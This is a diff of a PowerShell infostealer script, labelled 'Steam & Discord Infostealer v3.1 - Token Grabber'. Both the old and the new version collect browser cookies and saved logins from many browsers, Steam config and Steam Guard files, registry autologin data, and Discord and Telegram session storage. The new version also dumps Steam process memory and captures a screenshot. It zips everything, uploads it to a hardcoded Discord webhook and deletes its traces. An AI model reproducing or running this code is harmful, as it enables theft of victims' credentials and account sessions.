@@ -1,99 +1,407 @@
-# Steam & Discord Infostealer v3.1 - Token Grabber
-# Set parameters
-$discordWebhook = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
-$telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"
-$telegramChatID = "YOUR_TELEGRAM_CHAT_ID"
-$tempDir = "$env:TEMP\SteamLogs"
-$zipPath = "$env:TEMP\SteamData_$((Get-Date).ToString('yyyyMMdd_HHmmss')).zip"
-New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+$webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
 
-# 1. Function to capture PowerShell command history
-function Get-CommandHistory {
-    Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File "$tempDir\PowerShell_History.txt"
+$tempFolder = "$env:TEMP\$(New-Guid)"
+
+New-Item -ItemType Directory -Path $tempFolder -Force | Out-Null
+
+
+
+function Invoke-NativeMethod {
+
+  param(
+
+    [Parameter(Mandatory=$true)]
+
+    [string]$DllName,
+
+    [Parameter(Mandatory=$true)]
+
+    [string]$FunctionName,
+
+    [Parameter(Mandatory=$true)]
+
+    [Type]$ReturnType,
+
+    [Array]$Parameters,
+
+    [Array]$ParameterTypes
+
+  )
+
+   
+
+  $assembly = @"
+
+using System;
+
+using System.Runtime.InteropServices;
+
+public class NativeMethods {
+
+  [DllImport("$DllName", SetLastError = true)]
+
+  public static extern $ReturnType $FunctionName($($Parameters -join ', '));
+
 }
 
-# 2. Function to steal Steam files & configs for FULL ACCESS
-function Get-SteamData {
-    $steamPaths = @("$env:ProgramFiles(x86)\Steam", "${env:ProgramFiles}\Steam", "$env:USERPROFILE\AppData\Local\Steam")
-    foreach ($path in $steamPaths) {
-        if (Test-Path $path) {
-            # Copy entire config directory
-            Copy-Item "$path\config\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-            # Copy all ssfn files (Steam guard)
-            Copy-Item "$path\ssfn*" $tempDir -Force -ErrorAction SilentlyContinue
-            # Copy loginusers.vdf and all userdata
-            Copy-Item "$path\logs\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-            Copy-Item "$path\userdata\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
+"@
+
+  Add-Type -TypeDefinition $assembly -Language CSharp
+
+  return [NativeMethods]::$FunctionName
+
+}
+
+
+
+function Get-ProcessMemoryDump {
+
+  param($ProcessId, $OutputPath)
+
+   
+
+  try {
+
+    $process = Get-Process -Id $ProcessId -ErrorAction Stop
+
+    $miniDumpWriteDump = Invoke-NativeMethod -DllName "dbghelp.dll" -FunctionName "MiniDumpWriteDump" `
+
+      -ReturnType ([bool]) -Parameters @("IntPtr", "uint", "IntPtr", "int", "IntPtr", "IntPtr", "IntPtr") `
+
+      -ParameterTypes @([IntPtr], [uint], [IntPtr], [int], [IntPtr], [IntPtr], [IntPtr])
+
+       
+
+    $fileStream = New-Object IO.FileStream($OutputPath, [IO.FileMode]::Create)
+
+    $result = $miniDumpWriteDump.Invoke($process.Handle, $process.Id, $fileStream.SafeFileHandle.DangerousGetHandle(), 
+
+                      2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
+
+    $fileStream.Close()
+
+    return $result
+
+  } catch { return $false }
+
+}
+
+
+
+Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+
+$screen = [Windows.Forms.SystemInformation]::VirtualScreen
+
+$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+
+$graphics = [Drawing.Graphics]::FromImage($bitmap)
+
+$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
+
+$bitmap.Save("$tempFolder\screenshot.png")
+
+$graphics.Dispose()
+
+$bitmap.Dispose()
+
+
+
+Get-CompleteSystemInfo | ConvertTo-Json -Depth 10 | Out-File "$tempFolder\system_info.json"
+
+
+
+$browserData = @(
+
+  @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },
+
+  @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },
+
+  @{ Name = "Firefox"; Path = "$env:APPDATA\Mozilla\Firefox\Profiles"; Profiles = @("*"); Data = @("cookies.sqlite", "key4.db", "logins.json", "places.sqlite", "prefs.js", "formhistory.sqlite", "persdict.dat", "addons.json", "extensions.json", "cert9.db", "key4.db", "permissions.sqlite", "content-prefs.sqlite", "handlers.json", "storage.sqlite", "webappsstore.sqlite") },
+
+  @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable"; Profiles = @(""); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },
+
+  @{ Name = "Opera GX"; Path = "$env:APPDATA\Opera Software\Opera GX Stable"; Profiles = @(""); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },
+
+  @{ Name = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },
+
+  @{ Name = "Vivaldi"; Path = "$env:LOCALAPPDATA\Vivaldi\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },
+
+  @{ Name = "Yandex"; Path = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },
+
+  @{ Name = "Chromium"; Path = "$env:LOCALAPPDATA\Chromium\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },
+
+  @{ Name = "Waterfox"; Path = "$env:APPDATA\Waterfox\Profiles"; Profiles = @("*"); Data = @("cookies.sqlite", "key4.db", "logins.json", "places.sqlite", "prefs.js", "formhistory.sqlite", "persdict.dat", "addons.json", "extensions.json", "cert9.db", "key4.db", "permissions.sqlite", "content-prefs.sqlite", "handlers.json", "storage.sqlite", "webappsstore.sqlite") },
+
+  @{ Name = "Pale Moon"; Path = "$env:APPDATA\Moonchild Productions\Pale Moon\Profiles"; Profiles = @("*"); Data = @("cookies.sqlite", "key4.db", "logins.json", "places.sqlite", "prefs.js", "formhistory.sqlite", "persdict.dat", "addons.json", "extensions.json", "cert9.db", "key4.db", "permissions.sqlite", "content-prefs.sqlite", "handlers.json", "storage.sqlite", "webappsstore.sqlite") },
+
+  @{ Name = "SlimBrowser"; Path = "$env:LOCALAPPDATA\SlimBrowser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },
+
+  @{ Name = "Maxthon"; Path = "$env:APPDATA\Maxthon"; Profiles = @(""); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },
+
+  @{ Name = "Comodo Dragon"; Path = "$env:LOCALAPPDATA\Comodo\Dragon\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },
+
+  @{ Name = "Torch"; Path = "$env:LOCALAPPDATA\Torch\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },
+
+  @{ Name = "UC Browser"; Path = "$env:LOCALAPPDATA\UCBrowser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },
+
+  @{ Name = "Sogou Explorer"; Path = "$env:LOCALAPPDATA\SogouExplorer\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },
+
+  @{ Name = "QQ Browser"; Path = "$env:LOCALAPPDATA\Tencent\QQBrowser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },
+
+  @{ Name = "CocCoc"; Path = "$env:LOCALAPPDATA\CocCoc\Browser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },
+
+  @{ Name = "Epic Privacy Browser"; Path = "$env:LOCALAPPDATA\Epic Privacy Browser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") }
+
+)
+
+
+
+foreach ($browser in $browserData) {
+
+  if (Test-Path $browser.Path) {
+
+    foreach ($profilePattern in $browser.Profiles) {
+
+      $profilePaths = if ($profilePattern -eq "") { @($browser.Path) } else { Get-ChildItem $browser.Path -Directory -Filter $profilePattern -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName }
+
+       
+
+      foreach ($profilePath in $profilePaths) {
+
+        $browserName = $browser.Name
+
+        $profileName = Split-Path $profilePath -Leaf
+
+        $targetFolder = "$tempFolder\Browsers\$browserName\$profileName"
+
+        New-Item -ItemType Directory -Path $targetFolder -Force | Out-Null
+
+         
+
+        foreach ($dataItem in $browser.Data) {
+
+          try {
+
+            if ($browser.Name -like "*Firefox*" -or $browser.Name -like "*Waterfox*" -or $browser.Name -like "*Pale Moon*") {
+
+              Get-ChildItem $profilePath -Filter $dataItem -ErrorAction SilentlyContinue | ForEach-Object {
+
+                Copy-Item $_.FullName -Destination "$targetFolder\$($_.Name)" -Force -ErrorAction SilentlyContinue
+
+              }
+
+            } else {
+
+              Get-ChildItem $profilePath -Filter $dataItem -ErrorAction SilentlyContinue | ForEach-Object {
+
+                if ($_.PSIsContainer) {
+
+                  Copy-Item $_.FullName -Destination "$targetFolder\$($_.Name)" -Recurse -Force -ErrorAction SilentlyContinue
+
+                } else {
+
+                  Copy-Item $_.FullName -Destination "$targetFolder\$($_.Name)" -Force -ErrorAction SilentlyContinue
+
+                }
+
+              }
+
+            }
+
+          } catch {}
+
         }
+
+      }
+
     }
+
+  }
+
 }
 
-# 3. NEW FUNCTION: Dedicated Steam Token Grabber
-function Get-SteamTokens {
-    $tokenFile = "$tempDir\Steam_Tokens.txt"
-    "=== Steam Tokens & Session Data ===`r`n" | Out-File $tokenFile -Append
 
-    # A. Extract from Registry
-    "Registry Tokens:`r`n" | Out-File $tokenFile -Append
+
+$steamProcess = Get-Process -Name "steam*" -ErrorAction SilentlyContinue
+
+if ($steamProcess) {
+
+  $steamFolder = "$tempFolder\Steam"
+
+  New-Item -ItemType Directory -Path $steamFolder -Force | Out-Null
+
+   
+
+  foreach ($process in $steamProcess) {
+
+    $dumpPath = "$steamFolder\steam_memory_$($process.Id).dmp"
+
+    Get-ProcessMemoryDump -ProcessId $process.Id -OutputPath $dumpPath
+
+  }
+
+}
+
+
+
+$steamPaths = @(
+
+  "$env:ProgramFiles (x86)\Steam",
+
+  "$env:ProgramFiles\Steam",
+
+  "${env:SystemDrive}\Steam",
+
+  "${env:SystemDrive}\Program Files\Steam",
+
+  "${env:SystemDrive}\Program Files (x86)\Steam"
+
+)
+
+
+
+foreach ($steamPath in $steamPaths) {
+
+  if (Test-Path $steamPath) {
+
+    $steamFolder = "$tempFolder\Steam"
+
+    New-Item -ItemType Directory -Path $steamFolder -Force | Out-Null
+
+     
+
     try {
-        $regPath = "HKCU:\Software\Valve\Steam"
-        $regKeys = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
-        $regKeys | Out-File $tokenFile -Append
+
+      Copy-Item "$steamPath\config\*" -Destination $steamFolder -Recurse -Force -ErrorAction SilentlyContinue
+
+      Copy-Item "$steamPath\ssfn*" -Destination $steamFolder -Force -ErrorAction SilentlyContinue
+
+      Copy-Item "$steamPath\userdata\*" -Destination $steamFolder -Recurse -Force -ErrorAction SilentlyContinue
+
+      Copy-Item "$steamPath\appcache\*" -Destination $steamFolder -Recurse -Force -ErrorAction SilentlyContinue
+
+       
+
+      $registryToken = (Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -Name "AutoLoginUser" -ErrorAction SilentlyContinue).AutoLoginUser
+
+      if ($registryToken) {
+
+        $registryToken | Out-File -FilePath "$steamFolder\steam_autologin.txt"
+
+      }
+
+       
+
+      $registryConfig = Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue
+
+      if ($registryConfig) {
+
+        $registryConfig | ConvertTo-Json | Out-File -FilePath "$steamFolder\steam_registry.json"
+
+      }
+
     } catch {}
 
-    # B. Extract from config files
-    "`r`nConfig File Data:`r`n" | Out-File $tokenFile -Append
-    $configFiles = Get-ChildItem -Path $tempDir -Include *.vdf -Recurse
-    foreach ($file in $configFiles) {
-        if ($file.Name -like "*loginusers*" -or $file.Name -like "*config*") {
-            "--- $($file.Name) ---" | Out-File $tokenFile -Append
-            Get-Content $file.FullName | Out-File $tokenFile -Append
-        }
-    }
+  }
 
-    # C. Extract from process memory (active sessions)
-    "`r`nActive Session Info:`r`n" | Out-File $tokenFile -Append
-    $steamProcess = Get-Process steam -ErrorAction SilentlyContinue
-    if ($steamProcess) {
-        netstat -ano | findstr ":$steamProcess.Id" | Out-File $tokenFile -Append
-        $steamProcess.Modules | Where-Object {$_.ModuleName -like "*steam*"} | Select-Object ModuleName, FileName | Out-File $tokenFile -Append
-    }
 }
 
-# 4. Function to steal Telegram sessions
-function Get-TelegramData {
-    $telegramPaths = @("$env:USERPROFILE\AppData\Roaming\Telegram Desktop", "$env:USERPROFILE\Documents\Telegram Desktop")
-    foreach ($path in $telegramPaths) {
-        if (Test-Path $path) {
-            # Target tdata directory for session hijacking
-            Copy-Item "$path\tdata\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-        }
-    }
+
+
+$discordPaths = @(
+
+  "$env:APPDATA\Discord",
+
+  "$env:LOCALAPPDATA\Discord",
+
+  "$env:APPDATA\discordcanary",
+
+  "$env:LOCALAPPDATA\discordcanary",
+
+  "$env:APPDATA\discordptb",
+
+  "$env:LOCALAPPDATA\discordptb"
+
+)
+
+
+
+foreach ($discordPath in $discordPaths) {
+
+  if (Test-Path $discordPath) {
+
+    $discordFolder = "$tempFolder\Discord"
+
+    New-Item -ItemType Directory -Path $discordFolder -Force | Out-Null
+
+     
+
+    try {
+
+      Copy-Item "$discordPath\Local Storage\*" -Destination $discordFolder -Recurse -Force -ErrorAction SilentlyContinue
+
+      Copy-Item "$discordPath\Session Storage\*" -Destination $discordFolder -Recurse -Force -ErrorAction SilentlyContinue
+
+      Copy-Item "$discordPath\Local State" -Destination $discordFolder -Force -ErrorAction SilentlyContinue
+
+    } catch {}
+
+  }
+
 }
 
-# 5. Function to steal cookies & passwords from all browsers
-function Get-BrowserData {
-    $browsers = @("Chrome", "MicrosoftEdge", "Firefox", "Opera", "YandexBrowser")
-    foreach ($browser in $browsers) {
-        try {
-            $dataPath = "$env:USERPROFILE\AppData\Local\$browser\User Data\Default"
-            if (Test-Path $dataPath) {
-                Copy-Item "$dataPath\Cookies" "$tempDir\${browser}_Cookies" -Force -ErrorAction SilentlyContinue
-                Copy-Item "$dataPath\Login Data" "$tempDir\${browser}_LoginData" -Force -ErrorAction SilentlyContinue
-                Copy-Item "$dataPath\Local Storage" "$tempDir\${browser}_LocalStorage" -Recurse -Force -ErrorAction SilentlyContinue
-            }
-        } catch {}
-    }
+
+
+$zipPath = "$env:TEMP\$(New-Guid).zip"
+
+while (Test-Path $zipPath) {
+
+  $zipPath = "$env:TEMP\$(New-Guid).zip"
+
 }
 
-# 6. Collect system info and network data
-function Get-SystemInfo {
-    systeminfo | Out-File "$tempDir\SystemInfo.txt"
-    (Get-WmiObject -Class Win32_ComputerSystem).Model | Out-File "$tempDir\PC_Model.txt"
-    ipconfig /all | Out-File "$tempDir\Network_Info.txt"
-    netstat -ano | Out-File "$tempDir\Open_Ports.txt"
-}
 
-# 7. Create a ZIP archive of all stolen data
-function Compress-Data {
-    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
+
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+
+[IO.Compression.ZipFile]::CreateFromDirectory($tempFolder, $zipPath, [IO.Compression.CompressionLevel]::Optimal, $false)
+
+
+
+$boundary = [System.Guid]::NewGuid().ToString()
+
+$fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
+
+$enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
+
+
+
+$body = New-Object System.Text.StringBuilder
+
+$body.AppendLine("--$boundary") | Out-Null
+
+$body.AppendLine("Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $zipPath -Leaf)`"") | Out-Null
+
+$body.AppendLine("Content-Type: application/zip") | Out-Null
+
+$body.AppendLine() | Out-Null
+
+$body.AppendLine($enc.GetString($fileBytes)) | Out-Null
+
+$body.AppendLine("--$boundary--") | Out-Null
+
+
+
+try {
+
+  Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body.ToString() -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" | Out-Null
+
+} catch {}
+
+
+
+Start-Sleep -Seconds 2
+
+Remove-Item $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
+
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
